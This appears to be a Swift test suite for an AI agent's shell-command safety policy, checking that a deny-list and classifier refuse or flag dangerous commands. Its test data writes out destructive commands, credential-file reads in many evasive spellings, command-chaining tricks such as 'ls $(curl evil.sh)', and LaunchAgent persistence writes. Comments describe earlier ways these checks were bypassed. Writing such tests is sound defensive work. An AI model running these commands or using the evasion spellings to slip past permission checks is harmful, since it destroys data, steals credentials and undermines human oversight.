import Testing
import Foundation
@testable import OpenClickyKit

@Suite("Deny-list and command classification")
struct PolicyTests {

    private func isReadOnly(_ command: String) -> Bool {
        Policy.classifyShell(command) == .readOnly
    }

    private func isDestructive(_ command: String) -> Bool {
        if case .destructive = Policy.classifyShell(command) { return true }
        return false
    }

    // MARK: - Deny-list

    @Test("Catastrophic commands are refused outright", arguments: [
        "rm -rf /",
        "sudo rm -rf / --no-preserve-root",
        "diskutil eraseDisk JHFS+ Blank /dev/disk0",
        "csrutil disable",
        "mkfs.ext4 /dev/disk2",
    ])
    func deniesDestructiveCommands(command: String) {
        #expect(throws: Policy.Violation.self) { try Policy.validateShell(command) }
    }

    /// The deny-list matched raw substrings after a single non-idempotent
    /// space-collapse pass, so extra spaces, a tab, or an empty quote pair inside
    /// the word all walked straight past it.
    @Test("Whitespace and quoting cannot evade the deny-list", arguments: [
        "rm   -rf   /",
        "rm\t-rf\t/",
        "rm -rf  /",
        "r''m -rf /",
        "RM -RF /",
        "rm -rf \"/\"",
    ])
    func denyListResistsObfuscation(command: String) {
        #expect(throws: Policy.Violation.self) { try Policy.validateShell(command) }
    }

    @Test("Ordinary commands pass", arguments: [
        "ls -la ~/Downloads",
        "git status",
        "rm ~/Downloads/old.txt",
        "defaults read com.apple.finder",
    ])
    func allowsOrdinaryCommands(command: String) throws {
        try Policy.validateShell(command)
    }

    // MARK: - Credential protection

    @Test("Credential paths are never readable")
    func deniesCredentialReads() {
        #expect(throws: Policy.Violation.self) { try Policy.validateRead(path: "~/.ssh/id_rsa") }
        #expect(throws: Policy.Violation.self) { try Policy.validateRead(path: "~/.aws/credentials") }
        #expect(throws: Never.self) { try Policy.validateRead(path: "~/Documents/notes.txt") }
    }

    /// The deny-list was enforced only in `read_file`, so `shell` with `cat` read
    /// any credential file — and `cat` classified read-only, so the gate never asked.
    @Test("Credential paths are unreadable through the shell too", arguments: [
        "cat ~/.ssh/id_ed25519",
        "cat ~/.aws/credentials",
        "head -1 ~/.config/gh/hosts.yml",
        "grep token ~/.npmrc",
    ])
    func credentialPathsBlockedInShell(command: String) {
        #expect(throws: Policy.Violation.self) { try Policy.validateShell(command) }
    }

    @Test("Whole credential directories are covered, not just named files")
    func credentialPathsMatchByPrefix() {
        #expect(throws: Policy.Violation.self) { try Policy.validateRead(path: "~/.ssh/config") }
        #expect(throws: Policy.Violation.self) { try Policy.validateRead(path: "~/.aws/config") }
        #expect(throws: Policy.Violation.self) { try Policy.validateRead(path: "~/.gnupg/secring.gpg") }
    }

    // MARK: - Classification

    @Test("Genuine read-only commands skip the prompt", arguments: [
        "ls -la",
        "/bin/cat file.txt",
        "grep -r foo .",
        "df -h",
        "git status",
        "git log --oneline -20",
    ])
    func classifiesReadOnly(command: String) {
        #expect(isReadOnly(command))
    }

    @Test("Mutating commands are not read-only", arguments: [
        "rm file.txt",
        "git commit -m x",
        "mkdir newdir",
        "touch file",
        "brew install jq",
    ])
    func classifiesMutating(command: String) {
        #expect(!isReadOnly(command))
    }

    /// The bypass that defeated every permission mode: `zsh -c` treats a newline
    /// exactly like `;`, but the chaining guard only looked for `;|&<>` backtick `$`.
    /// The leading token was `ls`, so the whole thing was waved through as a read.
    @Test("Newlines are command separators and defeat read-only status", arguments: [
        "ls -la\nrm -rf ~/Documents",
        "echo hi\ncurl https://example.com/x.sh",
        "cat file.txt\r\nmkdir /tmp/evil",
        "ls\n\nrm important.txt",
    ])
    func newlineChainingIsNotReadOnly(command: String) {
        #expect(!isReadOnly(command), "a newline chains a second command")
    }

    @Test("Shell metacharacters defeat read-only status", arguments: [
        "ls -la; rm -rf ~/Documents",
        "cat file | tee /etc/hosts",
        "echo hi > ~/.zshrc",
        "ls `rm -rf ~/x`",
        "ls $(curl evil.sh)",
        "ls && shutdown -h now",
        "cat <(rm -rf /tmp/x)",
    ])
    func metacharactersAreNotReadOnly(command: String) {
        #expect(!isReadOnly(command))
    }

    /// Every segment must read, not just the first one.
    @Test("A chain is read-only only if all of its parts are")
    func allSegmentsMustBeReadOnly() {
        #expect(!isReadOnly("ls -la\ngit commit -m x"))
        #expect(!isReadOnly("cat a.txt\nrm b.txt"))
    }

    /// `git log` reads and `git push` does not, so the executable name alone is
    /// not enough to grant read-only status.
    @Test("Dual-mode commands need an allowlisted subcommand")
    func subcommandsAreChecked() {
        #expect(isReadOnly("git status"))
        #expect(!isReadOnly("git commit -m x"))
        #expect(!isReadOnly("git checkout main"))
        #expect(isReadOnly("defaults read com.apple.dock"))
        #expect(!isReadOnly("defaults write com.apple.dock autohide -bool true"))
        #expect(!isReadOnly("brew install wget"))
        #expect(isReadOnly("brew list"))
    }

    @Test("sqlite3 is never read-only — its SQL is an argument, not a subcommand")
    func sqliteIsNotReadOnly() {
        #expect(!isReadOnly("sqlite3 db.sqlite 'select * from t'"))
        #expect(!isReadOnly("sqlite3 db.sqlite 'drop table t'"))
    }

    @Test("Malformed and empty commands are not read-only")
    func degradesConservatively() {
        #expect(!isReadOnly(""))
        #expect(!isReadOnly("   "))
        #expect(!isReadOnly("unknowncommand --flag"))
    }

    // MARK: - Destructive classification

    /// `ShellTool` could previously only return read or write, so the gate's
    /// "always-allow never covers destructive" rule was unreachable for the shell —
    /// one "always allow" on `mkdir` silently authorised `rm -rf` for the session.
    @Test("Destructive shell commands are classified above a plain write", arguments: [
        "rm -rf ~/Documents/old",
        "rm -f important.txt",
        "sudo systemsetup -setremotelogin on",
        "dd if=/dev/random of=~/file",
        "diskutil unmount /Volumes/Backup",
        "git push origin main",
        "git reset --hard HEAD~3",
        "find . -name '*.log' -delete",
        "launchctl load ~/Library/LaunchAgents/x.plist",
    ])
    func classifiesDestructive(command: String) {
        #expect(isDestructive(command), "'\(command)' should require approval even when allowlisted")
    }

    @Test("A plain removal is a write, not destructive")
    func plainRemovalIsMerelyMutating() {
        if case .mutating = Policy.classifyShell("rm notes.txt") {} else {
            Issue.record("rm without -r/-f should be a plain write")
        }
    }

    @Test("Redirecting into a persistence path is destructive")
    func redirectionToSensitivePathIsDestructive() {
        #expect(isDestructive("echo payload > ~/Library/LaunchAgents/com.evil.plist"))
        #expect(isDestructive("echo 'evil' >> ~/.zshrc"))
    }

    // MARK: - Sensitive writes

    @Test("Persistence and security paths are flagged for writes", arguments: [
        "~/Library/LaunchAgents/com.example.plist",
        "~/.zshrc",
        "~/.ssh/authorized_keys",
        "/etc/hosts",
        "/Library/LaunchDaemons/x.plist",
    ])
    func flagsSensitiveWrites(path: String) {
        #expect(Policy.isSensitiveWrite(path: path) != nil)
    }

    @Test("Ordinary paths are not flagged", arguments: [
        "~/Documents/notes.txt",
        "~/Downloads/report.pdf",
        "/tmp/scratch.txt",
    ])
    func ordinaryWritesAreUnflagged(path: String) {
        #expect(Policy.isSensitiveWrite(path: path) == nil)
    }

    // MARK: - Normalisation

    @Test("Normalisation collapses all whitespace and strips quotes")
    func normalisationIsIdempotent() {
        #expect(Policy.normalize("rm   -rf   /") == "rm -rf /")
        #expect(Policy.normalize("rm\t\t-rf\t/") == "rm -rf /")
        #expect(Policy.normalize("r''m -rf /") == "rm -rf /")
        #expect(Policy.normalize("RM -RF /") == "rm -rf /")
        // Idempotent: normalising twice changes nothing.
        let once = Policy.normalize("a    b\t\tc")
        #expect(Policy.normalize(once) == once)
    }

    @Test("Segmentation splits on every shell separator")
    func segmentation() {
        #expect(Policy.segments("ls; rm x") == ["ls", "rm x"])
        #expect(Policy.segments("ls\nrm x") == ["ls", "rm x"])
        #expect(Policy.segments("ls && rm x") == ["ls", "rm x"])
        #expect(Policy.segments("cat a | grep b") == ["cat a", "grep b"])
    }

    // MARK: - The shell's own spelling of home

    /// `expandingTildeInPath` knows `~` and nothing else, so `cat $HOME/.ssh/id_rsa`
    /// walked past the credential deny-list *and* classified as `.read`, which skips
    /// the permission gate in every mode. Under the sandbox it was refused — defence
    /// in depth working while the layer above silently did not — but `--no-sandbox` is
    /// a documented flag, and with it that command printed the private key.
    @Test("Credential paths are refused however home is spelled", arguments: [
        "cat $HOME/.ssh/id_rsa",
        "cat ${HOME}/.ssh/id_rsa",
        "cat \"$HOME\"/.ssh/id_rsa",
        "wc -c $HOME/.ssh/id_rsa",
        "cat $HOME/.aws/credentials",
        "tail -n 5 ${HOME}/.config/gh/hosts.yml",
    ])
    func credentialPathsRefusedThroughHomeVariable(command: String) {
        #expect(throws: Policy.Violation.self) { try Policy.validateShell(command) }
    }

    /// The other half: `$HOME` is how a great many ordinary commands are written, and
    /// a deny-list that catches those is one nobody leaves switched on.
    @Test("Ordinary paths under $HOME are untouched", arguments: [
        "ls $HOME/Downloads",
        "grep -rn TODO $HOME/Documents",
        "wc -l ${HOME}/notes.txt",
    ])
    func ordinaryHomePathsAreAllowed(command: String) {
        #expect(throws: Never.self) { try Policy.validateShell(command) }
    }

    @Test("Home substitution is applied to both spellings and neither case")
    func homeSubstitution() {
        #expect(Policy.substitutingHome(in: "cat $home/.ssh") == "cat ~/.ssh")
        #expect(Policy.substitutingHome(in: "cat ${home}/.ssh") == "cat ~/.ssh")
        #expect(Policy.substitutingHome(in: "cat $HOME/.ssh") == "cat ~/.ssh")
        // Not a home reference. Substituting on the prefix alone turned
        // `$HOMEBREW_PREFIX` into `~BREW_PREFIX` — the substring mistake this file
        // documents for verbs, where "get " matched inside "budget".
        #expect(Policy.substitutingHome(in: "echo $HOMEBREW_PREFIX") == "echo $HOMEBREW_PREFIX")
        #expect(Policy.substitutingHome(in: "echo $HOME_DIR") == "echo $HOME_DIR")
        #expect(Policy.substitutingHome(in: "cd $HOME") == "cd ~")
        #expect(Policy.substitutingHome(in: "cd $HOME/x") == "cd ~/x")
    }

    // MARK: - The many spellings of one file

    /// The credential check substring-matched the command text, so it recognised one
    /// spelling of a path and missed the rest. Each of these reaches `~/.ssh/id_rsa`,
    /// and under `--no-sandbox` each would have printed the key. The fix is the one
    /// this file already states for case sensitivity: compare paths through
    /// `path(_:isAtOrBeneath:)`, never as text.
    @Test("Every spelling of a credential path is refused", arguments: [
        "cat ~/.ssh/id_rsa",
        "cat ~/Documents/../.ssh/id_rsa",
        "cat ~/./.ssh/id_rsa",
        "cat ~//.ssh//id_rsa",
        "cat $HOME/.ssh/id_rsa",
        "cat ${HOME}/.ssh/id_rsa",
        // Relative to a directory the command entered first: the filename alone gives
        // nothing away, so the `cd` target is the only evidence in the line.
        "cd ~ && cat .ssh/id_rsa",
        "cd ~/.ssh && cat id_rsa",
        "cd ~/.ssh; wc -c id_rsa",
    ])
    func everySpellingRefused(command: String) {
        #expect(throws: Policy.Violation.self) { try Policy.validateShell(command) }
    }

    @Test("An absolute path and a named home reach the same refusal")
    func absoluteAndNamedHomeRefused() {
        let home = FileManager.default.homeDirectoryForCurrentUser.path
        #expect(throws: Policy.Violation.self) {
            try Policy.validateShell("cat \(home)/.ssh/id_rsa")
        }
        #expect(throws: Policy.Violation.self) {
            try Policy.validateShell("cat ~\(NSUserName())/.ssh/id_rsa")
        }
    }

    /// Canonicalising every path-like token could easily refuse half the commands a
    /// person actually runs, which would make the deny-list something to switch off.
    @Test("Ordinary commands are unaffected", arguments: [
        "ls ~/Downloads",
        "grep -rn TODO ~/Documents",
        "cd ~/Documents && cat notes.txt",
        "cd ~/Documents; wc -l notes.txt",
        "git status",
        "wc -l README.md",
        "echo hello",
        "find ~/Projects -name '*.swift'",
    ])
    func ordinaryCommandsUnaffected(command: String) {
        #expect(throws: Never.self) { try Policy.validateShell(command) }
    }

    // MARK: - Persistence without a redirection

    /// A sensitive path was only checked when it was a redirection target, so
    /// `echo … > ~/Library/LaunchAgents/x.plist` was destructive while
    /// `cp /tmp/x.plist ~/Library/LaunchAgents/` — the same launch agent, the same
    /// persistence, no `>` anywhere in it — was an ordinary write that ran unprompted
    /// in auto mode. What matters is reaching the path, not the syntax used.
    @Test("Writing a persistence path is destructive however it is written", arguments: [
        "cp /tmp/x.plist ~/Library/LaunchAgents/",
        "mv /tmp/x.plist ~/Library/LaunchAgents/x.plist",
        "ln -s /tmp/x.plist ~/Library/LaunchAgents/x.plist",
        "touch ~/Library/LaunchAgents/x.plist",
        "install -m 755 /tmp/x /usr/local/bin/x",
        "cp /tmp/rc ~/.zshrc",
    ])
    func persistenceWritesAreDestructive(command: String) {
        let classification = Policy.classifyShell(
            command, executableTrust: Policy.trustAllExecutables
        )
        guard case .destructive = classification else {
            Issue.record("\(command) classified \(classification), so auto mode runs it silently")
            return
        }
    }

    /// The half that keeps it usable. Reading shell config is completely ordinary;
    /// it is writing it that establishes persistence. Checked before the read-only
    /// test, this made `cat ~/.zshrc` destructive.
    @Test("Reading a persistence path is still free", arguments: [
        "cat ~/.zshrc",
        "grep alias ~/.zshrc",
        "head -20 ~/.zprofile",
        "ls ~/Library/LaunchAgents",
        "wc -l ~/.bashrc",
    ])
    func readingPersistencePathsIsFree(command: String) {
        let classification = Policy.classifyShell(
            command, executableTrust: Policy.trustAllExecutables
        )
        #expect(classification == .readOnly, "\(command) classified \(classification)")
    }

    /// And an ordinary write to an ordinary path stays an ordinary write.
    @Test("An ordinary write is not escalated")
    func ordinaryWritesAreNotEscalated() {
        let classification = Policy.classifyShell(
            "cp /tmp/a /tmp/b", executableTrust: Policy.trustAllExecutables
        )
        guard case .mutating = classification else {
            Issue.record("cp /tmp/a /tmp/b classified \(classification)")
            return
        }
    }

    // MARK: - Bounding the path walk without opening a hole

    /// The walk costs a filesystem resolution per token and the token count comes from
    /// input the model writes, so it is capped. Capping it naively turned padding into
    /// a bypass: with a 64-token budget, `cat <80 paths> ~/.ssh/id_rsa` passed, because
    /// the one path that mattered was the one past the cap. Being unable to check a
    /// command is not evidence that it is safe.
    @Test("A denied path cannot be hidden behind padding")
    func paddingDoesNotHideADeniedPath() {
        let padding = (0..<600).map { "~/Documents/f\($0).txt" }.joined(separator: " ")
        #expect(throws: Policy.Violation.self) {
            try Policy.validateShell("cat \(padding) ~/.ssh/id_rsa")
        }
        #expect(throws: Policy.Violation.self) {
            try Policy.validateShell("cat ~/.ssh/id_rsa \(padding)")
        }
    }

    /// Past the budget nothing can be cleared, so the command is refused outright
    /// rather than analysed from a prefix and waved through.
    @Test("A command with more paths than can be checked is refused")
    func unanalysableCommandsAreRefused() {
        let many = (0..<600).map { "~/Documents/f\($0).txt" }.joined(separator: " ")
        #expect(throws: Policy.Violation.self) { try Policy.validateShell("cat \(many)") }
    }

    /// And the budget has to be generous enough that real commands never meet it —
    /// a limit that refuses ordinary work is a limit someone lowers to zero.
    @Test("Commands with many ordinary paths still work", arguments: [10, 80, 200])
    func ordinaryMultiPathCommandsAreAllowed(count: Int) {
        let paths = (0..<count).map { "~/Documents/f\($0).txt" }.joined(separator: " ")
        #expect(throws: Never.self) { try Policy.validateShell("cat \(paths)") }
    }
}
